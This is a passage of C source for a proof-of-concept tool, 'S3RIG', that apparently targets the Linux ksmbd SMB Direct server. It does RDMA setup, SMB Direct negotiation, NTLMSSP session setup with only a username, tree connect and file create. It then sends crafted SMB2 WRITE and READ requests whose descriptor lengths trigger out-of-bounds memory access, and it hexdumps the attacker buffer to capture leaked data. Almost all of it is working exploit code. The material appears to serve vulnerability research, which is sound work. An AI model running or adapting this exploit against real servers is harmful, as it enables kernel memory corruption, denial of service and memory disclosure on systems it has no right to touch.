> 	return total;
> }
> 
> /* ------------------------------------------------------------------- utility */
> 
> static void hexdump(const char *tag, const uint8_t *b, size_t n)
> {
> 	size_t i;
> 
> 	printf("%s (%zu bytes)\n", tag, n);
> 	for (i = 0; i < n; i++) {
> 		if (i % 16 == 0)
> 			printf("  %04zx:", i);
> 		printf(" %02x", b[i]);
> 		if (i % 16 == 15 || i + 1 == n)
> 			printf("\n");
> 	}
> 	fflush(stdout);
> }
> 
> static size_t to_utf16(uint8_t *out, const char *s)
> {
> 	size_t n = 0;
> 
> 	while (*s) {
> 		out[n++] = (uint8_t)*s++;
> 		out[n++] = 0;
> 	}
> 	return n;
> }
> 
> /* ----------------------------------------------------------------- transport */
> 
> struct rig {
> 	struct rdma_event_channel *ec;
> 	struct rdma_cm_id         *id;
> 	struct ibv_pd             *pd;
> 	struct ibv_cq             *cq;
> 
> 	uint8_t *sbuf; struct ibv_mr *smr;
> 	uint8_t *rbuf[NRECV]; struct ibv_mr *rmr[NRECV];
> 	uint8_t *abuf; struct ibv_mr *amr;
> 
> 	uint16_t pending_grant;
> 	uint32_t peer_max_readwrite_size;
> 	char devname[64];
> };
> 
> static int wait_cm(struct rig *r, enum rdma_cm_event_type want)
> {
> 	struct rdma_cm_event *ev;
> 
> 	if (rdma_get_cm_event(r->ec, &ev)) {
> 		perror("rdma_get_cm_event");
> 		return -1;
> 	}
> 	if (ev->event != want) {
> 		fprintf(stderr, "S3RIG: cm event %s (status %d), wanted %s\n",
> 			rdma_event_str(ev->event), ev->status, rdma_event_str(want));
> 		rdma_ack_cm_event(ev);
> 		return -1;
> 	}
> 	rdma_ack_cm_event(ev);
> 	return 0;
> }
> 
> static int post_recv(struct rig *r, int i)
> {
> 	struct ibv_sge sge = { .addr = (uintptr_t)r->rbuf[i],
> 			       .length = SMBD_MAX_RECV, .lkey = r->rmr[i]->lkey };
> 	struct ibv_recv_wr wr = { .wr_id = (uint64_t)i, .sg_list = &sge, .num_sge = 1 }, *bad;
> 
> 	if (ibv_post_recv(r->id->qp, &wr, &bad))
> 		return -1;
> 	r->pending_grant++;
> 	return 0;
> }
> 
> static int post_send(struct rig *r, size_t len)
> {
> 	struct ibv_sge sge = { .addr = (uintptr_t)r->sbuf,
> 			       .length = (uint32_t)len, .lkey = r->smr->lkey };
> 	struct ibv_send_wr wr = { .wr_id = 0x5000, .sg_list = &sge, .num_sge = 1,
> 				  .opcode = IBV_WR_SEND,
> 				  .send_flags = IBV_SEND_SIGNALED }, *bad;
> 
> 	return ibv_post_send(r->id->qp, &wr, &bad);
> }
> 
> /* Poll until one RECV completes; drain SEND completions on the way.
>   * timeout_ms <= 0 means "wait forever". Returns the recv index or -1. */
> static int poll_recv(struct rig *r, uint32_t *byte_len, int timeout_ms)
> {
> 	struct ibv_wc wc;
> 	struct timespec t0, tn;
> 
> 	clock_gettime(CLOCK_MONOTONIC, &t0);
> 	for (;;) {
> 		int n = ibv_poll_cq(r->cq, 1, &wc);
> 
> 		if (n < 0) {
> 			fprintf(stderr, "S3RIG: ibv_poll_cq failed\n");
> 			return -1;
> 		}
> 		if (n == 0) {
> 			if (timeout_ms > 0) {
> 				long ms;
> 
> 				clock_gettime(CLOCK_MONOTONIC, &tn);
> 				ms = (tn.tv_sec - t0.tv_sec) * 1000 +
> 				     (tn.tv_nsec - t0.tv_nsec) / 1000000;
> 				if (ms > timeout_ms) {
> 					fprintf(stderr, "S3RIG: poll timeout after %ld ms\n", ms);
> 					return -1;
> 				}
> 			}
> 			usleep(200);
> 			continue;
> 		}
> 		if (wc.status != IBV_WC_SUCCESS) {
> 			fprintf(stderr, "S3RIG: wc status %s (opcode %d, wr_id %llu)\n",
> 				ibv_wc_status_str(wc.status), wc.opcode,
> 				(unsigned long long)wc.wr_id);
> 			return -1;
> 		}
> 		if (wc.opcode == IBV_WC_RECV) {
> 			*byte_len = wc.byte_len;
> 			return (int)wc.wr_id;
> 		}
> 		/* else: a SEND completion; keep polling */
> 	}
> }
> 
> static int drain_send(struct rig *r)
> {
> 	struct ibv_wc wc;
> 	long spins = 0;
> 
> 	for (;;) {
> 		int n = ibv_poll_cq(r->cq, 1, &wc);
> 
> 		if (n < 0)
> 			return -1;
> 		if (n == 0) {
> 			if (++spins > 20000000)
> 				return -1;
> 			continue;
> 		}
> 		if (wc.status != IBV_WC_SUCCESS) {
> 			fprintf(stderr, "S3RIG: send wc status %s\n",
> 				ibv_wc_status_str(wc.status));
> 			return -1;
> 		}
> 		if (wc.opcode != IBV_WC_RECV)
> 			return 0;
> 		/* An unexpected recv arrived first. We cannot push it back, so
> 		 * treat it as a protocol error instead of silently losing it. */
> 		fprintf(stderr, "S3RIG: unexpected RECV while draining SEND\n");
> 		return -1;
> 	}
> }
> 
> static int rig_connect(struct rig *r, const char *host, const char *port)
> {
> 	struct rdma_addrinfo hints = { .ai_port_space = RDMA_PS_TCP }, *rai;
> 	struct ibv_qp_init_attr qa;
> 	struct rdma_conn_param cp;
> 	int i;
> 
> 	r->ec = rdma_create_event_channel();
> 	if (!r->ec) { perror("rdma_create_event_channel"); return -1; }
> 	if (rdma_create_id(r->ec, &r->id, NULL, RDMA_PS_TCP)) { perror("rdma_create_id"); return -1; }
> 	if (rdma_getaddrinfo(host, port, &hints, &rai)) { perror("rdma_getaddrinfo"); return -1; }
> 	if (rdma_resolve_addr(r->id, NULL, rai->ai_dst_addr, 5000)) { perror("rdma_resolve_addr"); return -1; }
> 	if (wait_cm(r, RDMA_CM_EVENT_ADDR_RESOLVED)) return -1;
> 	if (rdma_resolve_route(r->id, 5000)) { perror("rdma_resolve_route"); return -1; }
> 	if (wait_cm(r, RDMA_CM_EVENT_ROUTE_RESOLVED)) return -1;
> 
> 	snprintf(r->devname, sizeof(r->devname), "%s",
> 		 ibv_get_device_name(r->id->verbs->device));
> 
> 	r->pd = ibv_alloc_pd(r->id->verbs);
> 	r->cq = ibv_create_cq(r->id->verbs, 256, NULL, NULL, 0);
> 	if (!r->pd || !r->cq) { fprintf(stderr, "S3RIG: pd/cq failed\n"); return -1; }
> 
> 	memset(&qa, 0, sizeof(qa));
> 	qa.send_cq = r->cq;
> 	qa.recv_cq = r->cq;
> 	qa.qp_type = IBV_QPT_RC;
> 	qa.cap.max_send_wr  = 32;
> 	qa.cap.max_recv_wr  = 32;
> 	qa.cap.max_send_sge = 4;
> 	qa.cap.max_recv_sge = 4;
> 	if (rdma_create_qp(r->id, r->pd, &qa)) { perror("rdma_create_qp"); return -1; }
> 
> 	r->sbuf = calloc(1, SMBD_MAX_SEND);
> 	r->abuf = malloc(ATTACKER_MR_SIZE);
> 	if (!r->sbuf || !r->abuf) return -1;
> 	memset(r->abuf, 0x41, ATTACKER_MR_SIZE);
> 
> 	r->smr = ibv_reg_mr(r->pd, r->sbuf, SMBD_MAX_SEND, IBV_ACCESS_LOCAL_WRITE);
> 	if (!r->smr) { perror("ibv_reg_mr send"); return -1; }
> 	r->amr = ibv_reg_mr(r->pd, r->abuf, ATTACKER_MR_SIZE,
> 			    IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ |
> 			    IBV_ACCESS_REMOTE_WRITE);
> 	if (!r->amr) { perror("ibv_reg_mr attacker"); return -1; }
> 
> 	for (i = 0; i < NRECV; i++) {
> 		r->rbuf[i] = calloc(1, SMBD_MAX_RECV);
> 		if (!r->rbuf[i]) return -1;
> 		r->rmr[i] = ibv_reg_mr(r->pd, r->rbuf[i], SMBD_MAX_RECV,
> 				       IBV_ACCESS_LOCAL_WRITE);
> 		if (!r->rmr[i]) { perror("ibv_reg_mr recv"); return -1; }
> 		if (post_recv(r, i)) { perror("ibv_post_recv"); return -1; }
> 	}
> 
> 	memset(&cp, 0, sizeof(cp));
> 	cp.initiator_depth     = 8;
> 	cp.responder_resources = 8;
> 	cp.retry_count         = 6;
> 	cp.rnr_retry_count     = 6;
> 	if (rdma_connect(r->id, &cp)) { perror("rdma_connect"); return -1; }
> 	return wait_cm(r, RDMA_CM_EVENT_ESTABLISHED);
> }
> 
> /* SMB Direct negotiate, [MS-SMBD] 2.2.1/2.2.2, parsed by fs/smb/smbdirect/accept.c */
> static int smbd_negotiate(struct rig *r)
> {
> 	struct smbd_negotiate_req *q = (struct smbd_negotiate_req *)r->sbuf;
> 	struct smbd_negotiate_resp *p;
> 	uint32_t blen = 0;
> 	int idx;
> 
> 	memset(q, 0, sizeof(*q));
> 	q->min_version         = 0x0100;
> 	q->max_version         = 0x0100;
> 	q->credits_requested   = 255;         /* accept.c: must not be 0 */
> 	q->preferred_send_size = SMBD_MAX_SEND;
> 	q->max_receive_size    = SMBD_MAX_RECV;   /* >= 128    accept.c:385 */
> 	q->max_fragmented_size = SMBD_MAX_FRAG;   /* >= 131072 accept.c:394 */
> 
> 	if (post_send(r, sizeof(*q)) || drain_send(r))
> 		return -1;
> 	idx = poll_recv(r, &blen, 20000);
> 	if (idx < 0)
> 		return -1;
> 	if (blen < sizeof(*p)) {
> 		fprintf(stderr, "S3RIG: short smbd negotiate response (%u)\n", blen);
> 		return -1;
> 	}
> 	p = (struct smbd_negotiate_resp *)r->rbuf[idx];
> 	r->peer_max_readwrite_size = p->max_readwrite_size;
> 	printf("S3RIG: smbd negotiated ver=0x%04x status=0x%08x credits_granted=%u "
> 	       "max_readwrite_size=%u max_receive_size=%u\n",
> 	       p->negotiated_version, p->status, p->credits_granted,
> 	       p->max_readwrite_size, p->max_receive_size);
> 	fflush(stdout);
> 	if (p->status != 0)
> 		return -1;
> 	return post_recv(r, idx);
> }
> 
> /*
>   * One SMB2 request in one SMB Direct data transfer, then collect the response
>   * (reassembling if the server fragments it).
>   */
> static int smb2_xchg(struct rig *r, const uint8_t *pdu, size_t pdulen,
> 		     uint8_t *rsp, size_t rspcap, size_t *rsplen)
> {
> 	struct smbd_data_transfer *dt = (struct smbd_data_transfer *)r->sbuf;
> 	size_t got = 0;
> 	int first = 1;
> 
> 	if (SMBD_DATA_OFFSET + pdulen > SMBD_MAX_SEND) {
> 		fprintf(stderr, "S3RIG: pdu too large for one data transfer\n");
> 		return -1;
> 	}
> 	memset(r->sbuf, 0, SMBD_DATA_OFFSET);
> 	dt->credits_requested     = 255;
> 	dt->credits_granted       = r->pending_grant;
> 	dt->flags                 = 0;
> 	dt->remaining_data_length = 0;
> 	dt->data_offset           = SMBD_DATA_OFFSET;
> 	dt->data_length           = (uint32_t)pdulen;
> 	dt->padding               = 0;
> 	memcpy(r->sbuf + SMBD_DATA_OFFSET, pdu, pdulen);
> 	r->pending_grant = 0;
> 
> 	if (post_send(r, SMBD_DATA_OFFSET + pdulen) || drain_send(r))
> 		return -1;
> 
> 	for (;;) {
> 		struct smbd_data_transfer *in;
> 		uint32_t blen = 0, dlen, doff, rem;
> 		int idx = poll_recv(r, &blen, 60000);
> 
> 		if (idx < 0)
> 			return -1;
> 		in   = (struct smbd_data_transfer *)r->rbuf[idx];
> 		dlen = in->data_length;
> 		doff = in->data_offset;
> 		rem  = in->remaining_data_length;
> 		if (dlen) {
> 			uint32_t copy = dlen;
> 
> 			if ((uint64_t)doff + dlen > blen) {
> 				fprintf(stderr, "S3RIG: malformed data transfer\n");
> 				return -1;
> 			}
> 			if (got + copy > rspcap)
> 				copy = (uint32_t)(rspcap - got);
> 			memcpy(rsp + got, r->rbuf[idx] + doff, copy);
> 			got += copy;
> 		}
> 		if (post_recv(r, idx))
> 			return -1;
> 		/* A message ends at the fragment whose remaining_data_length is 0.
> 		 * data_length == 0 means a pure credit grant: keep waiting. */
> 		if (dlen && !rem)
> 			break;
> 	}
> 	(void)first;
> 	*rsplen = got;
> 	return 0;
> }
> 
> static uint32_t rsp_status(const uint8_t *rsp, size_t len)
> {
> 	uint32_t s;
> 
> 	if (len < 12)
> 		return 0xFFFFFFFFu;
> 	memcpy(&s, rsp + 8, 4);
> 	return s;
> }
> 
> /* -------------------------------------------------------------- SMB2 staging */
> 
> static int smb2_negotiate(struct rig *r, struct trig_params *p)
> {
> 	uint8_t pdu[256], rsp[2048];
> 	size_t rlen = 0;
> 	uint8_t *b = pdu;
> 
> 	memset(pdu, 0, sizeof(pdu));
> 	put_hdr((struct smb2_hdr_w *)b, SMB2_NEGOTIATE_CMD, p);
> 	*(uint16_t *)(b + 64)  = 36;        /* StructureSize */
> 	*(uint16_t *)(b + 66)  = 1;         /* DialectCount  */
> 	*(uint16_t *)(b + 68)  = 1;         /* SecurityMode = SIGNING_ENABLED */
> 	*(uint16_t *)(b + 70)  = 0;
> 	*(uint32_t *)(b + 72)  = 0;         /* Capabilities  */
> 	memset(b + 76, 0xA5, 16);           /* ClientGUID    */
> 	*(uint32_t *)(b + 92)  = 0;
> 	*(uint16_t *)(b + 96)  = 0;
> 	*(uint16_t *)(b + 98)  = 0;
> 	*(uint16_t *)(b + 100) = 0x0302;    /* SMB 3.0.2, passes smb2pdu.c:7275 */
> 
> 	if (smb2_xchg(r, pdu, 102, rsp, sizeof(rsp), &rlen))
> 		return -1;
> 	printf("S3RIG: SMB2 NEGOTIATE rsp %zu bytes status=0x%08x dialect=0x%04x\n",
> 	       rlen, rsp_status(rsp, rlen), rlen >= 68 ? *(uint16_t *)(rsp + 68) : 0);
> 	fflush(stdout);
> 	return rsp_status(rsp, rlen) == STATUS_SUCCESS ? 0 : -1;
> }
> 
> /* Raw NTLMSSP: decode_negotiation_token() fails both ASN.1 decodes and then sets
>   * conn->preferred_auth_mech = KSMBD_AUTH_NTLMSSP, use_spnego = false
>   * (fs/smb/server/smb2pdu.c:1557-1565). */
> static size_t build_ntlmssp_negotiate(uint8_t *o)
> {
> 	memset(o, 0, 32);
> 	memcpy(o, "NTLMSSP\0", 8);
> 	*(uint32_t *)(o + 8)  = 1;             /* NtLmNegotiate */
> 	*(uint32_t *)(o + 12) = 0x60088215;    /* UNICODE|OEM|REQ_TARGET|NTLM|
> 						  ALWAYS_SIGN|NTLMSSP_NEGOTIATE_
> 						  EXTENDED_SESSSECURITY|128|56 */
> 	/* DomainName / WorkstationName security_buffers stay zero */
> 	return 32;                             /* sizeof(struct negotiate_message) */
> }
> 
> /* struct authenticate_message is 64 bytes fixed (fs/smb/server/ntlmssp.h:129);
>   * only UserName has to be present for session_user() -> ksmbd_login_user(). */
> static size_t build_ntlmssp_auth(uint8_t *o, const char *user)
> {
> 	size_t nlen;
> 
> 	memset(o, 0, 64);
> 	memcpy(o, "NTLMSSP\0", 8);
> 	*(uint32_t *)(o + 8)  = 3;             /* NtLmAuthenticate */
> 	nlen = to_utf16(o + 64, user);
> 	/* security_buffer UserName at offset 8+4+8+8+8 = 36 */
> 	*(uint16_t *)(o + 36) = (uint16_t)nlen;
> 	*(uint16_t *)(o + 38) = (uint16_t)nlen;
> 	*(uint32_t *)(o + 40) = 64;
> 	*(uint32_t *)(o + 60) = 0x60088215;    /* NegotiateFlags */
> 	return 64 + nlen;
> }
> 
> static int smb2_session_setup(struct rig *r, struct trig_params *p, const char *user)
> {
> 	uint8_t pdu[512], rsp[2048], blob[256];
> 	size_t rlen = 0, blen;
> 	uint32_t st;
> 	int stage;
> 
> 	for (stage = 0; stage < 2; stage++) {
> 		blen = stage == 0 ? build_ntlmssp_negotiate(blob)
> 				  : build_ntlmssp_auth(blob, user);
> 		memset(pdu, 0, sizeof(pdu));
> 		p->message_id++;
> 		put_hdr((struct smb2_hdr_w *)pdu, SMB2_SESSION_SETUP_CMD, p);
> 		*(uint16_t *)(pdu + 64) = 25;                    /* StructureSize */
> 		pdu[66] = 0;                                     /* Flags         */
> 		pdu[67] = 1;                                     /* SecurityMode  */
> 		*(uint32_t *)(pdu + 68) = 0;                     /* Capabilities  */
> 		*(uint32_t *)(pdu + 72) = 0;                     /* Channel       */
> 		*(uint16_t *)(pdu + 76) = SMB2_SESS_BUFFER_OFF;
> 		*(uint16_t *)(pdu + 78) = (uint16_t)blen;
> 		*(uint64_t *)(pdu + 80) = 0;                     /* PrevSessionId */
> 		memcpy(pdu + SMB2_SESS_BUFFER_OFF, blob, blen);
> 
> 		if (smb2_xchg(r, pdu, SMB2_SESS_BUFFER_OFF + blen,
> 			      rsp, sizeof(rsp), &rlen))
> 			return -1;
> 		st = rsp_status(rsp, rlen);
> 		if (rlen >= 48)
> 			memcpy(&p->session_id, rsp + 40, 8);
> 		printf("S3RIG: SESSION_SETUP[%d] status=0x%08x session=0x%llx flags=0x%04x\n",
> 		       stage, st, (unsigned long long)p->session_id,
> 		       rlen >= 68 ? *(uint16_t *)(rsp + 66) : 0);
> 		fflush(stdout);
> 		if (stage == 0 && st != STATUS_MORE_PROCESSING_REQUIRED)
> 			return -1;
> 		if (stage == 1 && st != STATUS_SUCCESS)
> 			return -1;
> 	}
> 	return 0;
> }
> 
> static int smb2_tree_connect(struct rig *r, struct trig_params *p, const char *unc)
> {
> 	uint8_t pdu[512], rsp[512];
> 	size_t rlen = 0, plen;
> 	uint32_t st;
> 
> 	memset(pdu, 0, sizeof(pdu));
> 	p->message_id++;
> 	p->tree_id = 0;
> 	put_hdr((struct smb2_hdr_w *)pdu, SMB2_TREE_CONNECT_CMD, p);
> 	plen = to_utf16(pdu + SMB2_TCON_BUFFER_OFF, unc);
> 	*(uint16_t *)(pdu + 64) = 9;
> 	*(uint16_t *)(pdu + 66) = 0;
> 	*(uint16_t *)(pdu + 68) = SMB2_TCON_BUFFER_OFF;
> 	*(uint16_t *)(pdu + 70) = (uint16_t)plen;
> 
> 	if (smb2_xchg(r, pdu, SMB2_TCON_BUFFER_OFF + plen, rsp, sizeof(rsp), &rlen))
> 		return -1;
> 	st = rsp_status(rsp, rlen);
> 	if (rlen >= 40)
> 		memcpy(&p->tree_id, rsp + 36, 4);
> 	printf("S3RIG: TREE_CONNECT '%s' status=0x%08x tid=0x%08x\n", unc, st, p->tree_id);
> 	fflush(stdout);
> 	return st == STATUS_SUCCESS ? 0 : -1;
> }
> 
> static int smb2_create(struct rig *r, struct trig_params *p, const char *name,
> 		       uint64_t *eof)
> {
> 	uint8_t pdu[512], rsp[1024];
> 	size_t rlen = 0, nlen;
> 	uint32_t st;
> 
> 	memset(pdu, 0, sizeof(pdu));
> 	p->message_id++;
> 	put_hdr((struct smb2_hdr_w *)pdu, SMB2_CREATE_CMD, p);
> 	nlen = to_utf16(pdu + SMB2_CREATE_BUFFER_OFF, name);
> 	*(uint16_t *)(pdu + 64)  = 57;              /* StructureSize      */
> 	pdu[66] = 0;                                /* SecurityFlags      */
> 	pdu[67] = 0;                                /* RequestedOplock    */
> 	*(uint32_t *)(pdu + 68)  = 2;               /* Impersonation      */
> 	*(uint64_t *)(pdu + 72)  = 0;
> 	*(uint64_t *)(pdu + 80)  = 0;
> 	*(uint32_t *)(pdu + 88)  = 0x0012019F;      /* DesiredAccess: R/W/attrs */
> 	*(uint32_t *)(pdu + 92)  = 0x00000080;      /* FILE_ATTRIBUTE_NORMAL */
> 	*(uint32_t *)(pdu + 96)  = 0x00000007;      /* ShareAccess RWD    */
> 	*(uint32_t *)(pdu + 100) = 3;               /* FILE_OPEN_IF       */
> 	*(uint32_t *)(pdu + 104) = 0x00000040;      /* NON_DIRECTORY_FILE */
> 	*(uint16_t *)(pdu + 108) = SMB2_CREATE_BUFFER_OFF;
> 	*(uint16_t *)(pdu + 110) = (uint16_t)nlen;
> 	*(uint32_t *)(pdu + 112) = 0;
> 	*(uint32_t *)(pdu + 116) = 0;
> 
> 	if (smb2_xchg(r, pdu, SMB2_CREATE_BUFFER_OFF + nlen, rsp, sizeof(rsp), &rlen))
> 		return -1;
> 	st = rsp_status(rsp, rlen);
> 	if (rlen >= 144) {
> 		memcpy(&p->persistent_fid, rsp + 128, 8);
> 		memcpy(&p->volatile_fid,   rsp + 136, 8);
> 		if (eof)
> 			memcpy(eof, rsp + 112, 8);   /* EndofFile */
> 	}
> 	printf("S3RIG: CREATE '%s' status=0x%08x pfid=0x%llx vfid=0x%llx eof=%llu\n",
> 	       name, st, (unsigned long long)p->persistent_fid,
> 	       (unsigned long long)p->volatile_fid,
> 	       (unsigned long long)(eof ? *eof : 0));
> 	fflush(stdout);
> 	return st == STATUS_SUCCESS ? 0 : -1;
> }
> 
> /* Plain non-RDMA SMB2 READ, used to read back what the control write put there. */
> static int smb2_read_plain(struct rig *r, struct trig_params *p, uint32_t length,
> 			   uint8_t *out, size_t *outlen)
> {
> 	uint8_t pdu[256], rsp[2048];
> 	size_t rlen = 0;
> 	uint32_t st, dlen;
> 	uint8_t doff;
> 
> 	memset(pdu, 0, sizeof(pdu));
> 	p->message_id++;
> 	put_hdr((struct smb2_hdr_w *)pdu, SMB2_READ_CMD, p);
> 	*(uint16_t *)(pdu + 64) = 49;
> 	pdu[66] = 0;
> 	pdu[67] = 0;
> 	*(uint32_t *)(pdu + 68) = length;
> 	*(uint64_t *)(pdu + 72) = 0;
> 	memcpy(pdu + 80, &p->persistent_fid, 8);
> 	memcpy(pdu + 88, &p->volatile_fid, 8);
> 	*(uint32_t *)(pdu + 96)  = 0;   /* MinimumCount */
> 	*(uint32_t *)(pdu + 100) = 0;   /* Channel = none */
> 	*(uint32_t *)(pdu + 104) = 0;   /* RemainingBytes */
> 	*(uint16_t *)(pdu + 108) = 0;   /* ReadChannelInfoOffset */
> 	*(uint16_t *)(pdu + 110) = 0;   /* ReadChannelInfoLength */
> 	pdu[112] = 0;                   /* Buffer[0], StructureSize is odd */
> 
> 	if (smb2_xchg(r, pdu, 113, rsp, sizeof(rsp), &rlen))
> 		return -1;
> 	st = rsp_status(rsp, rlen);
> 	if (st != STATUS_SUCCESS || rlen < 80) {
> 		printf("S3RIG: plain READ status=0x%08x len=%zu\n", st, rlen);
> 		fflush(stdout);
> 		return -1;
> 	}
> 	doff = rsp[66];
> 	memcpy(&dlen, rsp + 68, 4);
> 	if ((size_t)doff + dlen > rlen)
> 		return -1;
> 	if (dlen > *outlen)
> 		dlen = (uint32_t)*outlen;
> 	memcpy(out, rsp + doff, dlen);
> 	*outlen = dlen;
> 	return 0;
> }
> 
> /* ---------------------------------------------------------------------- main */
> 
> static void usage(const char *a0)
> {
> 	fprintf(stderr,
> 		"usage: %s -h <server-ip> [-P <port>] [-s <unc>] [-f <file>] [-u <user>]\n"
> 		"          [-m control|dirA|dirB|all] [-b <buflen>] [-0 <desc0>] [-1 <desc1>]\n",
> 		a0);
> }
> 
> int main(int argc, char **argv)
> {
> 	struct rig r;
> 	struct trig_params p;
> 	const char *host = NULL, *port = SMBD_PORT_DEFAULT;
> 	const char *unc = NULL, *file = "s3-victim.bin", *user = "s3guest";
> 	const char *mode = "all";
> 	char uncbuf[256];
> 	uint8_t pdu[512], rsp[1024], back[256];
> 	size_t pdulen, rlen = 0, blen;
> 	uint64_t eof = 0;
> 	uint32_t ctl_len = 64;
> 	int c, rc_control = -1;
> 
> 	memset(&r, 0, sizeof(r));
> 	memset(&p, 0, sizeof(p));
> 	p.buflen    = TRIG_BUFLEN;
> 	p.desc0_len = TRIG_DESC0_LEN;
> 	p.desc1_len = TRIG_DESC1_LEN;
> 
> 	while ((c = getopt(argc, argv, "h:P:s:f:u:m:b:0:1:")) != -1) {
> 		switch (c) {
> 		case 'h': host = optarg; break;
> 		case 'P': port = optarg; break;
> 		case 's': unc  = optarg; break;
> 		case 'f': file = optarg; break;
> 		case 'u': user = optarg; break;
> 		case 'm': mode = optarg; break;
> 		case 'b': p.buflen    = (uint32_t)strtoul(optarg, NULL, 0); break;
> 		case '0': p.desc0_len = (uint32_t)strtoul(optarg, NULL, 0); break;
> 		case '1': p.desc1_len = (uint32_t)strtoul(optarg, NULL, 0); break;
> 		default: usage(argv[0]); return 2;
> 		}
> 	}
> 	if (!host) { usage(argv[0]); return 2; }
> 	if (!unc) {
> 		snprintf(uncbuf, sizeof(uncbuf), "\\\\%s\\share", host);
> 		unc = uncbuf;
> 	}
> 	if (p.desc0_len <= p.buflen) {
> 		fprintf(stderr,
> 			"S3RIG: desc0_len (%u) must be > buflen (%u) or rw.c:143 never clamps\n",
> 			p.desc0_len, p.buflen);
> 		return 2;
> 	}
> 
> 	printf("S3RIG: target %s:%s unc='%s' file='%s' user='%s' mode=%s\n",
> 	       host, port, unc, file, user, mode);
> 	printf("S3RIG: params buflen=%u desc0=%u desc1=%u\n",
> 	       p.buflen, p.desc0_len, p.desc1_len);
> 	fflush(stdout);
> 
> 	if (rig_connect(&r, host, port)) {
> 		printf("S3RIG: READINESS rxe=no smbd_connected=no  (rdma_cm connect failed)\n");
> 		fflush(stdout);
> 		return 1;
> 	}
> 	printf("S3RIG: rdma connected via device '%s'\n", r.devname);
> 	fflush(stdout);
> 
> 	if (smbd_negotiate(&r)) {
> 		printf("S3RIG: READINESS rxe=%s smbd_connected=no  (smbd negotiate failed)\n",
> 		       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
> 		fflush(stdout);
> 		return 1;
> 	}
> 
> 	p.mr_addr = (uint64_t)(uintptr_t)r.abuf;
> 	p.mr_rkey = r.amr->rkey;
> 	p.message_id = 0;
> 
> 	if (smb2_negotiate(&r, &p) ||
> 	    smb2_session_setup(&r, &p, user) ||
> 	    smb2_tree_connect(&r, &p, unc) ||
> 	    smb2_create(&r, &p, file, &eof)) {
> 		printf("S3RIG: READINESS rxe=%s smbd_connected=no  (SMB2 staging failed)\n",
> 		       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
> 		fflush(stdout);
> 		return 1;
> 	}
> 
> 	printf("S3RIG: READINESS rxe=%s smbd_connected=yes\n",
> 	       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
> 	fflush(stdout);
> 
> 	/* ---------------- B. CONTROL: a well-formed single-descriptor RDMA WRITE */
> 	{
> 		struct trig_params q = p;
> 		uint32_t i;
> 
> 		for (i = 0; i < ctl_len; i++)
> 			r.abuf[i] = (uint8_t)(0xC0 + (i & 0x0f));
> 		q.message_id = ++p.message_id;
> 		q.buflen     = ctl_len;
> 		q.desc0_len  = ctl_len;      /* == RemainingBytes: rw.c:143 does NOT clamp */
> 		pdulen = build_write_trigger(pdu, sizeof(pdu), &q, 1);
> 		if (!pdulen || smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
> 			printf("S3RIG: CONTROL benign_rdma_write=fail (exchange failed)\n");
> 			fflush(stdout);
> 			return 1;
> 		}
> 		printf("S3RIG: control WRITE status=0x%08x\n", rsp_status(rsp, rlen));
> 		fflush(stdout);
> 		if (rsp_status(rsp, rlen) != STATUS_SUCCESS) {
> 			printf("S3RIG: CONTROL benign_rdma_write=fail (status)\n");
> 			fflush(stdout);
> 			return 1;
> 		}
> 		blen = sizeof(back);
> 		if (smb2_read_plain(&r, &p, ctl_len, back, &blen) || blen != ctl_len) {
> 			printf("S3RIG: CONTROL benign_rdma_write=fail (readback %zu bytes)\n", blen);
> 			fflush(stdout);
> 			return 1;
> 		}
> 		rc_control = memcmp(back, r.abuf, ctl_len);
> 		printf("S3RIG: CONTROL benign_rdma_write=%s\n", rc_control ? "fail" : "ok");
> 		hexdump("S3RIG: control readback", back, blen > 32 ? 32 : blen);
> 		fflush(stdout);
> 		if (rc_control) {
> 			return 1;
> 		}
> 	}
> 
> 	if (!strcmp(mode, "control")) {
> 		printf("S3RIG: RUN-COMPLETE\n");
> 		fflush(stdout);
> 		return 0;
> 	}
> 
> 	/* ---------------- C. THE FINDING, direction A --------------------------- */
> 	if (!strcmp(mode, "dirA") || !strcmp(mode, "all")) {
> 		memset(r.abuf, 0x41, ATTACKER_MR_SIZE);
> 		p.message_id++;
> 		pdulen = build_write_trigger(pdu, sizeof(pdu), &p, 2);
> 		printf("S3RIG: dirA SMB2 WRITE RemainingBytes=%u desc[0].length=%u "
> 		       "desc[1].length=%u -> OOB starts at data_buf+%u\n",
> 		       p.buflen, p.desc0_len, p.desc1_len, p.buflen);
> 		hexdump("S3RIG: dirA PDU", pdu, pdulen);
> 		rlen = 0;
> 		if (smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
> 			printf("S3RIG: TRIGGER dirA sent status=NORESPONSE "
> 			       "(connection died, check the server log)\n");
> 			fflush(stdout);
> 			printf("S3RIG: RUN-COMPLETE\n");
> 			fflush(stdout);
> 			return 0;
> 		}
> 		printf("S3RIG: TRIGGER dirA sent status=0x%08x\n", rsp_status(rsp, rlen));
> 		fflush(stdout);
> 	}
> 
> 	/* ---------------- D. direction B ---------------------------------------- */
> 	if (!strcmp(mode, "dirB") || !strcmp(mode, "all")) {
> 		struct trig_params q = p;
> 
> 		/* Verifier correction: the OOB begins at aux_payload_buf +
> 		 * ALIGN(Length, 8) (smb2pdu.c:7428), so Length must equal the file
> 		 * size for the OOB to start at the object end. */
> 		memset(r.abuf, 0, ATTACKER_MR_SIZE);
> 		q.message_id = ++p.message_id;
> 		/* Length == buflen == the file size, so ALIGN(Length,8) == nbytes and
> 		 * the OOB starts at the end of the kvmalloc().  desc[0].length must
> 		 * still be > nbytes or rw.c:143 never clamps. */
> 		pdulen = build_read_trigger(pdu, sizeof(pdu), &q, p.buflen);
> 		printf("S3RIG: dirB SMB2 READ Length=%u desc[0].length=%u desc[1].length=%u\n",
> 		       p.buflen, q.desc0_len, q.desc1_len);
> 		rlen = 0;
> 		if (smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
> 			printf("S3RIG: TRIGGER dirB sent status=NORESPONSE\n");
> 			fflush(stdout);
> 			printf("S3RIG: RUN-COMPLETE\n");
> 			fflush(stdout);
> 			return 0;
> 		}
> 		printf("S3RIG: TRIGGER dirB sent status=0x%08x\n", rsp_status(rsp, rlen));
> 		hexdump("S3RIG: dirB attacker MR after the read", r.abuf, 256);
> 		fflush(stdout);
> 	}
> 
> 	printf("S3RIG: RUN-COMPLETE\n");
> 	fflush(stdout);
